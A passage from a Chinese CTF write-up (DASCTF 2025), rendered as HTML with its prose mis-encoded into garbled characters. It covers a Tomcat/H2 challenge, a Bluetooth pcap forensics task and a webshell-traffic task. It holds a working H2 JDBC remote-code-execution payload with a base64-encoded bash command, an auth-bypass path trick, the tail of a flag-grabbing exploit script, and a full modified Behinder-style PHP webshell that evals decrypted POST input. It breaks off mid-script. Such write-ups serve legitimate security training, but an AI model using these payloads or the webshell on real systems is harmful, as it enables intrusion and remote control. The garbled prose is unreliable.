</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;DASCTF{.*?}&#34;</span><span class=p>,</span> <span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Got flag:&#34;</span><span class=p>,</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Flag not found&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --------------------------</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>exp</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=æ³½è¥¿å²›èµ›å>æ³½è¥¿å²›ï¼ˆèµ›åï¼‰</h2><p>ä¸å‡ºç½‘H2 RCEï¼Œåˆ©ç”¨waråŒ…éƒ¨ç½²ï¼Œå¯ä»¥ç›´æ¥å†™å…¥æ–‡ä»¶</p><p>é‰´æƒç»•è¿‡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-TypeScript data-lang=TypeScript><span class=line><span class=cl><span class=kr>public</span> <span class=k>void</span> <span class=nx>filter</span><span class=p>(</span><span class=nx>ContainerRequestContext</span> <span class=nx>containerRequestContext</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>String</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>containerRequestContext</span><span class=p>.</span><span class=nx>getUriInfo</span><span class=p>().</span><span class=nx>getPath</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isBaseFile</span><span class=p>(</span><span class=nx>path</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>WHITELIST</span><span class=p>.</span><span class=nx>contains</span><span class=p>(</span><span class=nx>path</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>String</span> <span class=nx>authHeader</span> <span class=o>=</span> <span class=nx>containerRequestContext</span><span class=p>.</span><span class=nx>getHeaderString</span><span class=p>(</span><span class=s2>&#34;Authorization&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>authHeader</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=nx>authHeader</span><span class=p>.</span><span class=nx>startsWith</span><span class=p>(</span><span class=s2>&#34;Bearer &#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>String</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>authHeader</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=s2>&#34;Bearer &#34;</span><span class=p>.</span><span class=nx>length</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>DecodedJWT</span> <span class=nx>var5</span> <span class=o>=</span> <span class=nx>JwtValidator</span><span class=p>.</span><span class=nx>verifyJwt</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nx>var6</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=p>.</span><span class=nx>abortWithUnauthorized</span><span class=p>(</span><span class=nx>containerRequestContext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=p>.</span><span class=nx>abortWithUnauthorized</span><span class=p>(</span><span class=nx>containerRequestContext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>private</span> <span class=k>void</span> <span class=nx>abortWithUnauthorized</span><span class=p>(</span><span class=nx>ContainerRequestContext</span> <span class=nx>containerRequestContext</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>containerRequestContext</span><span class=p>.</span><span class=nx>abortWith</span><span class=p>(</span><span class=nx>Response</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=nx>Status</span><span class=p>.</span><span class=nx>UNAUTHORIZED</span><span class=p>).</span><span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location&#34;</span><span class=p>,</span> <span class=s2>&#34;/401.jsp&#34;</span><span class=p>).</span><span class=nx>build</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>private</span> <span class=kr>static</span> <span class=kr>boolean</span> <span class=nx>isBaseFile</span><span class=p>(</span><span class=nb>String</span> <span class=nx>path</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>!</span><span class=nx>path</span><span class=p>.</span><span class=nx>contains</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>path</span><span class=p>.</span><span class=nx>contains</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>é‡ç‚¹åœ¨è¿™é‡Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-TypeScript data-lang=TypeScript><span class=line><span class=cl><span class=kr>private</span> <span class=kr>static</span> <span class=kr>boolean</span> <span class=nx>isBaseFile</span><span class=p>(</span><span class=nb>String</span> <span class=nx>path</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>!</span><span class=nx>path</span><span class=p>.</span><span class=nx>contains</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>path</span><span class=p>.</span><span class=nx>contains</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>é…ç½®äº†é™æ€èµ„æºçš„è®¿é—®ï¼Œå¯¼è‡´äº†ç»•è¿‡ã€‚ç›´æ¥è®¿é—®/api/testConnect;.jså³å¯</p><p>ç›´æ¥æ‰“JDBC RCEå°±å¯ä»¥ï¼Œéœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œå‚è€ƒæ–‡ç« </p><p><a href=https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html>https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html</a></p><p>è¿™é‡Œç›´æ¥æ³¨é‡Šæ‰ï¼Œåˆ©ç”¨$CATALINA_HOMEç¡®å®štomcatçš„æ ¹ç›®å½•</p><p>æ„é€ Payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>jdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INI\T=CREATE ALIAS EXEC AS &#39;void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\;}&#39;\;CALL EXEC (&#39;bash -c {echo,Y2F0IC9mbGFnID4gJENBVEFMSU5BX0hPTUUvd2ViYXBwcy9ST09ULzQwNC5qc3A\=}|{base64,-d}|{bash,-i}&#39;)\;--\
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>Misc</h1><h2 id=bluetrace>BlueTrace</h2><p>ä¸€å¼€å§‹å…ˆç”¨netaæ¢­äº†ä¸€ä¸‹ï¼Œå‘ç°èƒ½å¾—åˆ°ä¸€å¼ jpgï¼Œå‘ç°æ˜¾ç¤ºä¸å…¨</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/01279d99-7aaa-4fbe-b3f8-8c406ecf39e4.png alt=img></p><p>çŒœæµ‹æ˜¯netaæå–çš„æœ‰é—®é¢˜ï¼Œä¼°è®¡æ˜¯åšé™åˆ¶äº†ï¼Œæ•…è½¬æ‰‹æ“ï¼š</p><p>ä¼—æ‰€å‘¨çŸ¥è“ç‰™ä¼ è¾“çš„åè®®ä¸€èˆ¬æ˜¯obexï¼Œæ‰€ä»¥è¿‡æ»¤ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™é‡Œæ˜æ˜¾æ˜¯ä¼ äº†ä¸€ä¸ªjpgçš„</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/33618614-7e91-4c5f-a7d4-055098b8a52f.png alt=img></p><p>ç”¨tsharkå¯¼å‡ºä¸€ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>tshark -r BlueTrace.pcapng -Y &#34;obex&#34; -T fields -e data &gt; obex_payload.txt
</span></span></code></pre></td></tr></table></div></div><p>å¯¼å‡ºåå°†æ•°æ®æ‹‰åˆ°010ï¼Œåˆ†æä¸€ä¸‹ä¼šå‘ç°è—äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼ˆå¯ä»¥ç›´æ¥å°†æµé‡åŒ…æ‹¿å»binwalkå°±ä¼šå‘ç°æœ‰è¿™ä¹ˆä¸ªå‹ç¼©åŒ…äº†ï¼‰</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/fd147174-057a-4b4e-b7c2-c19fad4ce93a.png alt=img></p><p>å…¨éƒ¨æå–å‡ºæ¥ï¼Œæ ¹æ®010çš„æ¨¡æ¿ä¼šå‘ç°å†…å®¹æ˜¯ä¸å…¨çš„</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/7a0a5ddc-f7e4-4136-a343-baa4fbe15438.png alt=img></p><p>å›åˆ°wiresharkåˆ†æä¸€ä¸‹ï¼Œä¼šå‘ç°åœ¨æœ€åé¢è¿˜æ¼äº†ä¸€ä¸ªæµé‡æ•°æ®ï¼Œå°†ä»–å•ç‹¬æå–å‡ºæ¥æ‹¼ä¸Šåå³å¯ä¿®å¤å‹ç¼©åŒ…</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/604fb2fb-2908-4fa7-84b1-5d95d5a7ee69.png alt=img></p><p>æ‰“å¼€åå®ƒæç¤ºæˆ‘ä»¬å¯†ç æ˜¯è“ç‰™ä¼ è¾“çš„ç›®æ ‡ç”µè„‘åå­—</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/a0b85729-7f2a-4fb2-9920-5a9135aa631a.png alt=img></p><p>åœ¨wiresharkçš„æ— çº¿ä¸­æ‰¾åˆ°è“ç‰™è®¾å¤‡ï¼Œç„¶åç®€å•éå†ä¸€ä¸‹å°±çŸ¥é“å¯†ç æ˜¯<code>INFERNITYã®PC</code></p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6b95853a-1064-4cec-b6e9-49d61a22f66d.png alt=img></p><p>è§£å‹å¾—åˆ°ä¸€å¼ å¥‡æ€ªçš„pngå›¾ï¼ŒçŒœæµ‹æ˜¯lsbéšå†™ï¼Œstegsolveåˆ†ææ‰¾åˆ°flag</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6135bd3f-db5e-436d-87cb-603e8139a4c1.png alt=img></p><h2 id=webshell-plus>Webshell Plus</h2><p>æ ¹æ®é¢˜æ„æ˜“å¾—webshellæµé‡ï¼Œé‚£ä¹ˆå°±çœ‹æ˜¯å“ªç§å¸¸è§çš„ï¼Œç®€å•åˆ†æå¯ä»¥å‘ç°ä¼ äº†ä¸ªshell.php</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/26764c97-ca32-4fdf-8663-1181593712d9.png alt=img></p><p>å…¶å†…å®¹å¦‚ä¸‹ï¼Œä¸éš¾çœ‹å‡ºå°±æ˜¯å†°èï¼Œä½†åˆä¸å¤ªä¸€æ ·ï¼Œæ˜¾ç„¶é­”æ”¹äº†ï¼Œä¸€å¼€å§‹ä¼šè¿›è¡Œæ£€æµ‹ï¼Œå½“æ”»å‡»è€…è¿›è¡Œå¯†é’¥äº¤æ¢æ—¶ï¼ˆä¼ å…¥gene_keyå’Œpublic_keyï¼‰ï¼Œshellçš„keyä¸ºä¸€ä¸ªéšæœºçš„8å­—èŠ‚çš„å­—ç¬¦ä¸²è½¬hexåå–md5çš„å‰16ä¸ªå­—ç¬¦ï¼Œç„¶åç”¨è¿™ä¸ªkeyç»“åˆä¼ å…¥çš„public_keyè¿›è¡ŒopensslåŠ å¯†ï¼Œæœ€åè¾“å‡ºè¢«ä¸¤ä¸ª8é•¿åº¦çš„ä¼ªé€ base64å­—ç¬¦ä¸²åŒ…å«çš„base64å­—ç¬¦ä¸²</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>------</span><span class=nx>WebKitFormBoundary2AdFNokm3wx5QuXV</span> 
</span></span><span class=line><span class=cl><span class=nx>Content</span><span class=o>-</span><span class=nx>Disposition</span><span class=o>:</span> <span class=nx>form</span><span class=o>-</span><span class=nx>data</span><span class=p>;</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;file&#34;</span><span class=p>;</span> <span class=nx>filename</span><span class=o>=</span><span class=s2>&#34;shell.php&#34;</span> 
</span></span><span class=line><span class=cl><span class=nx>Content</span><span class=o>-</span><span class=nx>Type</span><span class=o>:</span> <span class=nx>text</span><span class=o>/</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>geneB64RandStr</span><span class=p>(</span><span class=nx>int</span> <span class=nv>$length</span><span class=p>)</span><span class=o>:</span> <span class=nx>string</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$validChars</span> <span class=o>=</span> <span class=s1>&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$maxIndex</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$validChars</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$randomString</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$length</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$randomString</span> <span class=o>.=</span> <span class=nv>$validChars</span><span class=p>[</span><span class=nx>random_int</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nv>$maxIndex</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$randomString</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;gene_key&#39;</span><span class=p>])</span> <span class=k>and</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;public_key&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>geneB64RandStr</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$public_key</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;public_key&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$p</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$key</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$p</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>extension_loaded</span><span class=p>(</span><span class=s1>&#39;openssl&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>openssl_public_encrypt</span><span class=p>(</span><span class=nv>$p</span><span class=p>,</span> <span class=nv>$encrypted_key</span><span class=p>,</span> <span class=nv>$public_key</span><span class=p>,</span> <span class=nx>OPENSSL_PKCS1_PADDING</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$encrypted_key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>geneB64RandStr</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;OpenSSL extension not available&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$key</span> <span class=o>=</span> <span class=s2>&#34;e45e329feb5d925b&#34;</span><span class=p>;</span> <span class=c1>// Default key: rebeyond
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl> <span class=nx>session_write_close</span><span class=p>();</span>
</span></span><span class=line><span class=cl> <span class=nv>$post</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>extension_loaded</span><span class=p>(</span><span class=s1>&#39;openssl&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$t</span><span class=o>=</span><span class=s2>&#34;base64_&#34;</span><span class=o>.</span><span class=s2>&#34;decode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nv>$post</span><span class=o>=</span><span class=nv>$t</span><span class=p>(</span><span class=nv>$post</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$post</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$key</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>       <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=k>else</span>
</span></span><span class=line><span class=cl> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$post</span><span class=o>=</span><span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$post</span><span class=p>,</span> <span class=s2>&#34;AES128&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$arr</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=nv>$post</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$func</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$params</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl> <span class=k>class</span> <span class=nc>C</span><span class=p>{</span><span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(</span><span class=nv>$p</span><span class=p>)</span> <span class=p>{</span><span class=k>eval</span><span class=p>(</span><span class=nv>$p</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);}}</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>call_user_func</span><span class=p>(</span><span class=k>new</span> <span class=nx>C</span><span class=p>(),</span><span class=nv>$params</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span><span class=line><span class=cl><span class=err>------WebKitFormBoundary2AdFNokm3wx5QuXV-- 
</span></span></span></code></pre></td></tr></table></div></div><p>æ¥ç€åˆ†æï¼Œå‘ç°æ”»å‡»è€…ç¡®è®¤ä¼ äº†è¿™ä¿©å‚æ•°ï¼Œæ‰€ä»¥keyå€¼å°±ä¸æ˜¯é»˜è®¤çš„äº†ï¼Œå¯ä»¥çœ‹åˆ°å›æ˜¾å°±æ˜¯è¢«ä¸¤ä¸ª8é•¿åº¦çš„ä¼ªé€ base64å­—ç¬¦ä¸²åŒ…å«çš„base64å­—ç¬¦ä¸²ï¼Œç°åœ¨è¦åšçš„å°±æ˜¯æ‰¾åˆ°RSAçš„ç§é’¥å»è§£å‡ºpå€¼å’Œkey</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/3c888a6d-f36e-43ef-b53a-85a8d18181de.png alt=1></p><p>ç”¨å¨å­è§£ä¸€ä¸‹ä¼ å…¥çš„public_keyï¼Œå¯ä»¥å¾—åˆ°RSAçš„å…¬é’¥ï¼Œç»“åˆæœåˆ°çš„è¿™ç¯‡æ–‡ç« </p><p><a href=https://weiyubo.top/2019/03/31/RSA%20%E8%A7%A3%E5%AF%86%20%EF%BC%88%E5%B7%B2%E7%9F%A5%E5%85%AC%E9%92%A5%EF%BC%89/>https://weiyubo.top/2019/03/31/RSA%20%E8%A7%A3%E5%AF%86%20%EF%BC%88%E5%B7%B2%E7%9F%A5%E5%85%AC%E9%92%A5%EF%BC%89/</a> çˆ†ç ´ç§é’¥</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/2e926d28-f8fc-4254-957f-be28978ff2f6.png alt=img></p><p>ç”¨è¿™ä¸ªåœ¨çº¿ç½‘ç«™https://www.ssleye.com/ssltool/pub_asysi.html è§£å‡ºnï¼Œç„¶åç”¨yafuçˆ†ç ´å¾—åˆ°på’Œqï¼Œæ¥ç€æŒ‰ç…§æ–‡ç« æ“ä½œå¾—å‡ºç§é’¥æ–‡ä»¶å³å¯</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/d78b73c2-3401-40e4-bc31-0384887b9250.png alt=img></p><p>ç„¶åæ“ä¸ªè„šæœ¬è§£å‡ºpå’Œkey</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64decode</span>
